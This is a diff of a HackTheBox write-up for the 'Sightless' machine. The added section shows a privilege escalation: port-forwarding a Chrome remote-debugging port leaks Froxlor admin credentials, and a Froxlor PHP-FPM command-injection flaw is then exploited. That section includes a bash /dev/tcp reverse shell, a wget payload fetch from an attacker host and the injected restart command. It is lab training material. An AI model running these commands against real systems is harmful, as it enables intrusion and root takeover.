@@ -3,7 +3,7 @@ title: Sightless - HackTheBox
 authors: Samarth
 date: 2024-12-01 16:30:00 +0530
 categories: [HackTheBox Machines]
-tags: [Linux, FTPd, Web, CVE-2022-0944 ]
+tags: [Linux, FTPd, Web, CVE-2022-0944,  ]
 math: true
 mermaid: true
 ---
@@ -52,7 +52,7 @@ I have discovered two services: SSH and HTTP. Let's begin by enumerating the HTT
 
 I have observed that in Nmap scan, IP address gives us a reference to a domain name `sightless.htb`. So, we have to add this domain to `"/etc/hosts"` file.
 
-Let's open [http://slightless.htb/]().
+Let's open [__http://slightless.htb/__]().
 
 ![Browser View](/assets/images/writeups/Sightless-HTB/1.png)
 
@@ -88,7 +88,7 @@ Let's browse the SQLPad website and enumerate it to run SQL queries or find some
 
 I have found `SQLPad` version as `6.10.0`. Let's browse Google and try to find exploit for this SQLPad version if any exists.
 
-SQLPad version 6.10.0 is vulnerable to <b>[__`CVE-2022-0944`__](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944)</b>. 
+SQLPad version 6.10.0 is vulnerable to [__CVE-2022-0944__](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944). 
 
 ## Exploitation
 
@@ -176,6 +176,89 @@ Let's find active TCP network connections, listening ports, and the correspondin
 I have found `127.0.0.1:8080` might be used by Froxlor service. Let's do port forwarding into my machine's ip.
 
 ![Froxlor](/assets/images/writeups/Sightless-HTB/13.png)
+
+
+While browsing for sometime and reviewing running processes in the system. I came across remote debugging port. I realised that Google Chrome Debugger can help me to debug the web application. Google Chrome Debugger is a tool that debug web application if the running Google Chrom debugger at specific port `--remote-debugging-port=<port>`.
+
+![Remote Debugging Port](/assets/images/writeups/Sightless-HTB/14.png)
+
+`remote-debugging-port=0`, it means that the remote debugging feature of Google Chrome (or any Chromium-based browser) will not have a fixed port. Instead, Chrome will dynamically assign an available port for remote debugging.
+
+For identifying all the active TCP connections, I will use `netstat -tnlp`.
+
+![Netstat -tnlp](/assets/images/writeups/Sightless-HTB/15.png)
+
+There are so many ports active for TCP connections, I will be using each of the ports one by one to port forwarding until I receive connection on Chrome Debugger. Once the port forwarding is initiated, I will be using Google Chrome Debugger (`chrome://inspect/#devices`). 
+
+I will be starting target discovery on Chrome Developer Toolfor that specific port which I have used during port forwarding to see if the connection is successful.
+
+I will be starting with highest port `45553` to start port forwarding and same for chrome debugger.
+
+```bash
+ssh -L 45553:127.0.0.1:45553 michael@10.10.11.32
+```
+
+![Port Forwarding](/assets/images/writeups/Sightless-HTB/16.png)
+
+Once the port forwarding is initiated, I will be `Inspect with Chrome Developer Tool` (`chrome://inspect/#devices`).
+
+![Chrome Debugger Tool](/assets/images/writeups/Sightless-HTB/17.png)
+
+Once I started the Chrome Debugger, I received the remote target access. While inspecting the web application. I have received the login credential for `Froxlor` service.
+
+![Admin Credential](/assets/images/writeups/Sightless-HTB/18.png)
+
+Let's utilise the credential and login as Admin to `Froxlor` login panel.
+
+`admin:ForlorfroxAdmin`
+
+![Froxlor Dashboard](/assets/images/writeups/Sightless-HTB/19.png)
+
+Dashboard reveals the version of `Froxlor` that is `2.1.8`. While browsing, I came across towards `PHP-FPM`. Let's understand what `PHP-FPM` does.
+
+FPM (FastCGI Process Manager) is a primary PHP FastCGI implementation containing some features (mostly) useful for heavy-loaded sites.
+
+FPM requires `php-fpm restart command`, `configuration directory of php-fpm` and `process manager control`. Let's combine `Froxlor` version and `PHP-FPM` and search if any any vulnerability exist for this version.
+
+I searched for `Froxlor RCE` and I have found this blog [__Disclosing Froxlor V2.x Authenticated RCE as Root Vulnerability via PHP-FPM__](https://sarperavci.com/Froxlor-Authenticated-RCE/).
+
+The vulnerability allows to run arbitrary command in `php-fpm restart command` parameter. In the above blog, it is explained that there are couple of steps to follow to exploit the vulnerability.
+
+1. `First` - Create a one liner reverse shell
+
+```bash
+bash -i >& /dev/tcp/<Attacker IP>/<Attacker Listener Port> 0>&1
+```
+
+2. `Second` - Transfer this shell to victim machine (`10.10.11.32`)
+
+```bash
+ wget http://<Attacker IP address>/shell.sh
+ chmod +x shell.sh
+ mv shell.sh /tmp
+```
+3. `Third` - Provide the following payload to `php-fpm restart command` parameter.
+
+```bash
+/bin/bash /tmp/shell.sh
+```
+
+![PHP-FPM restart command](/assets/images/writeups/Sightless-HTB/20.png)
+
+Once you provided command, save the setting and start listener at attacker's machine.
+
+After setting the custom `PHP-FPM restart command`, go to `System` -> `Settings` and click on `PHP-FPM`. After that, click on disable, wait for a few seconds, and click on enable. This will restart the PHP-FPM service and execute the reverse shell.
+
+Let's wait for few minute and then check listener to see if I have got the root shell or not.
+
+![Root Shell](/assets/images/writeups/Sightless-HTB/21.png)
+
+![Machine Pwned](https://www.hackthebox.com/achievement/machine/337503/624)
+
+Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t).
+
+
+
 
 
 
